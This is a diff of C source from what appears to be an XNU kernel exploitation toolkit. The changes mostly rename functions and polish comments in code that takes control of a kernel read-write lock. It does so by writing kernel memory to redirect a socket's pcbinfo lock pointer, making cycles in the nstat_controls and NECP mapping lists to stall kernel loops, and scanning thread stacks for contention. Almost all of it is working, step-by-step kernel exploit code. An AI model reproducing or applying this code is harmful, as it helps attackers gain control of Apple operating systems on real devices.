@@ -107,8 +107,9 @@
 /// }
 ///
 /// As noted above we can create an infinite loop in `nstat_pcb_cache` by creating a cycle in
-/// `nstat_controls` tailq. The infinite loop can be easily stopped by breaking the cycle in tailq.
-/// This allows us to have total control over when the `target_lck_rw` lock will be released.
+/// `nstat_controls` linked list. The infinite loop can be easily stopped by breaking the cycle in the
+/// linked list. This allows us to have total control over when the `target_lck_rw` lock will be
+/// released.
 ///
 /// But there is a problem, the method `in_pcbrehash` uses members `ipi_hashmask` and
 /// `ipi_hash_base` of `so->so_pcb->inp_pcbinfo` for computing the variable `head`.
@@ -199,13 +200,15 @@
 /// the value of pointer `so->so_pcb->inp_pcbinfo` to `target_lck_rw - offsetof(struct inpcbinfo, ipi_lock)`
 /// before the lock is released
 ///
+/// See implementation below for more details.
+///
 
 
 #define MAX_NECP_UUID_MAPPING_ID 128
 #define LR_LCK_RW_EXCLUSIVE_GEN_OFFSET 0xac
 
 
-struct xpl_util_lck_rw {
+struct xpl_lck_rw {
     int sock_fd;
     uintptr_t target_lck_rw;
     uintptr_t socket;
@@ -221,8 +224,8 @@ struct xpl_util_lck_rw {
 };
 
 /// sets value of `socket->so_pcb->inp_pcbinfo` such that address of
-/// `socket->so_pcb->inp_pcbinfo.ipi_lock = target_lck_rw`
-void xpl_util_lck_rw_set_lock(xpl_util_lck_rw_t util) {
+/// `socket->so_pcb->inp_pcbinfo.ipi_lock` = `target_lck_rw`
+void xpl_lck_rw_set_lock(xpl_lck_rw_t util) {
     xpl_assert(util->inp_pcbinfo != 0);
     xpl_assert(util->so_pcb != 0);
     uintptr_t new_inp_pcbinfo = util->target_lck_rw - TYPE_INPCBINFO_MEM_IPI_LOCK_OFFSET;
@@ -230,8 +233,8 @@ void xpl_util_lck_rw_set_lock(xpl_util_lck_rw_t util) {
     xpl_kmem_write_uint64(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET, new_inp_pcbinfo);
 }
 
-/// restores socket->so_pcb->inp_pcbinfo
-void xpl_util_lck_rw_restore_lock(xpl_util_lck_rw_t util) {
+/// restores `socket->so_pcb->inp_pcbinfo`
+void xpl_lck_rw_restore_lock(xpl_lck_rw_t util) {
     xpl_assert(util->inp_pcbinfo != 0);
     xpl_assert(util->so_pcb != 0);
     xpl_kmem_write_uint64(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET, util->inp_pcbinfo);
@@ -239,7 +242,7 @@ void xpl_util_lck_rw_restore_lock(xpl_util_lck_rw_t util) {
 
 /// make the loop `for (state = nstat_controls; state; state = state->ncs_next) { ... }`
 /// in `nstat_pcb_cache` method infinite
-void xpl_util_lck_create_nstat_controls_cycle(xpl_util_lck_rw_t util) {
+void xpl_util_lck_create_nstat_controls_cycle(xpl_lck_rw_t util) {
     xpl_assert(util->nstat_controls_head != 0);
     xpl_assert(util->nstat_controls_tail != 0);
     xpl_assert(xpl_kmem_read_uint64(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET) == 0);
@@ -247,7 +250,7 @@ void xpl_util_lck_create_nstat_controls_cycle(xpl_util_lck_rw_t util) {
 }
 
 /// break infinite loop in nstat_pcb_cache
-void xpl_util_lck_break_nstat_controls_cycle(xpl_util_lck_rw_t util) {
+void xpl_util_lck_break_nstat_controls_cycle(xpl_lck_rw_t util) {
     xpl_assert(util->nstat_controls_head != 0);
     xpl_assert(util->nstat_controls_tail != 0);
     xpl_assert(xpl_kmem_read_uint64(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET) == util->nstat_controls_head);
@@ -255,7 +258,7 @@ void xpl_util_lck_break_nstat_controls_cycle(xpl_util_lck_rw_t util) {
 }
 
 /// save head and tail of nstat_controls tailq
-void xpl_util_lck_read_nstat_controls_state(xpl_util_lck_rw_t util) {
+void xpl_util_lck_read_nstat_controls_state(xpl_lck_rw_t util) {
     xpl_assert(util->nstat_controls_head == 0);
     xpl_assert(util->nstat_controls_tail == 0);
     uintptr_t head = xpl_kmem_read_uint64(xpl_slider_kernel_slide(VAR_NSTAT_CONTROLS_ADDR), 0);
@@ -275,23 +278,23 @@ void xpl_util_lck_read_nstat_controls_state(xpl_util_lck_rw_t util) {
 
 /// make the `LIST_FOREACH()...` loop in `necp_uuid_lookup_uuid_with_service_id_locked`
 /// method infinite
-void xpl_util_lck_create_necp_mapping_cycle(xpl_util_lck_rw_t util) {
+void xpl_util_lck_create_necp_mapping_cycle(xpl_lck_rw_t util) {
     xpl_assert(util->necp_uuid_id_mapping_head != 0);
     xpl_assert(util->necp_uuid_id_mapping_tail != 0);
     xpl_assert(xpl_kmem_read_uint64(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET) == 0);
     xpl_kmem_write_uint64(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET, util->necp_uuid_id_mapping_head);
 }
 
-/// break infinite loop in necp_uuid_lookup_uuid_with_service_id_locked
-void xpl_util_lck_break_necp_mapping_cycle(xpl_util_lck_rw_t util) {
+/// break infinite loop in `necp_uuid_lookup_uuid_with_service_id_locked`
+void xpl_util_lck_break_necp_mapping_cycle(xpl_lck_rw_t util) {
     xpl_assert(util->necp_uuid_id_mapping_head != 0);
     xpl_assert(util->necp_uuid_id_mapping_tail != 0);
     xpl_assert(xpl_kmem_read_uint64(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET) == util->necp_uuid_id_mapping_head);
     xpl_kmem_write_uint64(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET, 0);
 }
 
-/// ensures LIST_FOREACH in necp_uuid_lookup_uuid_with_service_id_locked never breaks
-void xpl_util_lck_invalidate_necp_ids(xpl_util_lck_rw_t util) {
+/// ensures `LIST_FOREACH` in `necp_uuid_lookup_uuid_with_service_id_locked never` breaks
+void xpl_util_lck_invalidate_necp_ids(xpl_lck_rw_t util) {
     xpl_assert(util->necp_uuid_id_mapping_head != 0);
     xpl_assert(util->necp_uuid_id_mapping_tail != 0);
     uintptr_t cursor = util->necp_uuid_id_mapping_head;
@@ -304,8 +307,8 @@ void xpl_util_lck_invalidate_necp_ids(xpl_util_lck_rw_t util) {
     } while (cursor != util->necp_uuid_id_mapping_tail);
 }
 
-/// restores id of necp_uuid_id_mapping
-void xpl_util_lck_restore_necp_ids(xpl_util_lck_rw_t util) {
+/// restores id of `necp_uuid_id_mapping`
+void xpl_util_lck_restore_necp_ids(xpl_lck_rw_t util) {
     xpl_assert(util->necp_uuid_id_mapping_head != 0);
     xpl_assert(util->necp_uuid_id_mapping_tail != 0);
     uintptr_t cursor = util->necp_uuid_id_mapping_head;
@@ -318,8 +321,8 @@ void xpl_util_lck_restore_necp_ids(xpl_util_lck_rw_t util) {
     } while (cursor != util->necp_uuid_id_mapping_tail);
 }
 
-/// save head and tail of necp_uuid_id_mapping list
-void xpl_util_lck_read_necp_uuid_id_mapping_state(xpl_util_lck_rw_t util) {
+/// save head and tail of `necp_uuid_id_mapping` list
+void xpl_util_lck_read_necp_uuid_id_mapping_state(xpl_lck_rw_t util) {
     xpl_assert(util->necp_uuid_id_mapping_head == 0);
     xpl_assert(util->necp_uuid_id_mapping_tail == 0);
     uintptr_t head = xpl_kmem_read_uint64(xpl_slider_kernel_slide(VAR_NECP_UUID_SERVICE_ID_LIST_ADDR), 0);
@@ -338,7 +341,7 @@ void xpl_util_lck_read_necp_uuid_id_mapping_state(xpl_util_lck_rw_t util) {
 }
 
 
-xpl_util_lck_rw_t xpl_util_lck_rw_lock_exclusive(uintptr_t lock) {
+xpl_lck_rw_t xpl_lck_rw_lock_exclusive(uintptr_t lock) {
     uintptr_t proc = xpl_xnu_proc_current_proc();
     
     /// STEP 1: Create a new IPv6 UDP socket
@@ -368,7 +371,7 @@ xpl_util_lck_rw_t xpl_util_lck_rw_lock_exclusive(uintptr_t lock) {
     uintptr_t inpcb = xpl_kmem_read_uint64(socket, TYPE_SOCKET_MEM_SO_PCB_OFFSET);
     uintptr_t inp_pcbinfo = xpl_kmem_read_uint64(inpcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET);
     
-    xpl_util_lck_rw_t util = (xpl_util_lck_rw_t)malloc(sizeof(struct xpl_util_lck_rw));
+    xpl_lck_rw_t util = (xpl_lck_rw_t)malloc(sizeof(struct xpl_lck_rw));
     bzero(util, sizeof(*util));
     util->sock_fd = sock_fd;
     util->socket = socket;
@@ -384,7 +387,7 @@ xpl_util_lck_rw_t xpl_util_lck_rw_lock_exclusive(uintptr_t lock) {
     /// `socket->so_pcb->inp_pcbinfo.ipi_lock = util->target_lck_rw`
     /// This lock is acquired by method `in6_pcbdisconnect` defined in in6_pcb.c when
     /// `util->socket` is disconnected
-    xpl_util_lck_rw_set_lock(util);
+    xpl_lck_rw_set_lock(util);
     
     /// STEP 4: Create a cycle in `nstat_controls` linked list. This will creates a infinite loop in
     /// `nstat_pcb_cache` function. This method is triggered by method `in6_pcbdisconnect`
@@ -418,12 +421,12 @@ xpl_util_lck_rw_t xpl_util_lck_rw_lock_exclusive(uintptr_t lock) {
 }
 
 
-void xpl_util_lck_rw_lock_done(xpl_util_lck_rw_t* util_p) {
-    xpl_util_lck_rw_t util = *util_p;
+void xpl_lck_rw_lock_done(xpl_lck_rw_t* util_p) {
+    xpl_lck_rw_t util = *util_p;
     
     /// STEP 6: Restore the value of `socket->so_pcb->inp_pcbinfo` so that operations in
-    /// `in_pcbrehash` requiring `inp_pcbinfo` will not cause panic
-    xpl_util_lck_rw_restore_lock(util);
+    /// `in_pcbrehash` requiring values from `inp_pcbinfo` will not cause panic
+    xpl_lck_rw_restore_lock(util);
     
     /// STEP 7: Assigns different laddr (other than loopback) to `socket->so_pcb->inp_dependladdr`.
     /// This prevents `necp_socket_bypass` method from returning `NECP_BYPASS_TYPE_LOOPBACK`
@@ -505,20 +508,20 @@ void xpl_util_lck_rw_lock_done(xpl_util_lck_rw_t* util_p) {
     }
     xpl_log_debug("INP2_INHASHLIST flag is now set");
     
-    /// STEP 12: Set the address of `socket->so_pcb->inp_pcbinfo.ipi_lock` back to util->target_lck_rw
-    /// so that correct lock will be unlocked when the program reaches `lck_rw_done` in `in6_pcbdisconnect`
-    xpl_util_lck_rw_set_lock(util);
+    /// STEP 12: Set the address of `socket->so_pcb->inp_pcbinfo.ipi_lock` back to `util->target_lck_rw`
+    /// so that correct lock will be released when the program reaches `lck_rw_done` in `in6_pcbdisconnect`
+    xpl_lck_rw_set_lock(util);
     
-    /// STEP 13: Restore id and break the loop in infinite loop in `necp_uuid_lookup_uuid_with_service_id_locked `
+    /// STEP 13: Restore id and break the infinite loop in `necp_uuid_lookup_uuid_with_service_id_locked `
     xpl_util_lck_restore_necp_ids(util);
     xpl_util_lck_break_necp_mapping_cycle(util);
     
-    /// STEP 14: Wait until socket `disconnectx` returns success. Once this happens, the
+    /// STEP 14: Wait until socket `disconnectx` returns. Once this happens, the
     /// lock `util->target_lck_rw` will be released
     dispatch_semaphore_wait(util->sem_disconnect_done, DISPATCH_TIME_FOREVER);
     
     /// Restores value of `socket->so_pcb->inp_pcbinfo`
-    xpl_util_lck_rw_restore_lock(util);
+    xpl_lck_rw_restore_lock(util);
     
     dispatch_release(util->sem_disconnect_done);
     free(util);
@@ -526,15 +529,15 @@ void xpl_util_lck_rw_lock_done(xpl_util_lck_rw_t* util_p) {
 }
 
 
-uintptr_t xpl_util_lck_rw_locking_thread(xpl_util_lck_rw_t util) {
+uintptr_t xpl_lck_rw_locking_thread(xpl_lck_rw_t util) {
     return util->locking_thread;
 }
 
 
 /// Wait until the thread `thread` tries to acquire exclusive lock of read write lock `util->target_lck_rw`
 /// using `lck_rw_lock_exclusive` or `IORWLockWrite` method
-int xpl_util_lck_rw_wait_for_contention(xpl_util_lck_rw_t util, uintptr_t thread, uintptr_t* lr_stack_ptr) {
-    /// ~  try for 10 seconds
+int xpl_lck_rw_wait_for_contention(xpl_lck_rw_t util, uintptr_t thread, uintptr_t* lr_stack_ptr) {
+    /// try for ~ 10 seconds
     int max_tries = 1000;
     
     do {
@@ -544,11 +547,12 @@ int xpl_util_lck_rw_wait_for_contention(xpl_util_lck_rw_t util, uintptr_t thread
             continue;
         }
         
+        /// Link register value for branch with link call from `lck_rw_lock_exclusive` to `lck_rw_exclusive_gen`
         uintptr_t lr_exclusive_gen = xpl_slider_kernel_slide(FUNC_LCK_RW_LOCK_EXCLUSIVE_ADDR) + LR_LCK_RW_EXCLUSIVE_GEN_OFFSET;
-        xpl_assert_cond(xpl_kmem_read_uint32(lr_exclusive_gen - 4, 0), ==, xpl_util_asm_build_bl_instr(xpl_slider_kernel_slide(FUNC_LCK_RW_LOCK_EXCLUSIVE_GEN_ADDR), lr_exclusive_gen - 4));
+        xpl_assert_cond(xpl_kmem_read_uint32(lr_exclusive_gen - 4, 0), ==, xpl_asm_build_bl_instr(xpl_slider_kernel_slide(FUNC_LCK_RW_LOCK_EXCLUSIVE_GEN_ADDR), lr_exclusive_gen - 4));
         
         uintptr_t found_address;
-        int error = xpl_xnu_thread_scan_stack(thread, lr_exclusive_gen, xpl_PTRAUTH_MASK, 512, &found_address);
+        int error = xpl_xnu_thread_scan_stack(thread, lr_exclusive_gen, XPL_PTRAUTH_MASK, 512, &found_address);
         if (error == EBADF || error == ENOENT) {
             xpl_log_verbose("no contention by %p (stack_scan err: %d)", (void*)thread, error);
             continue;
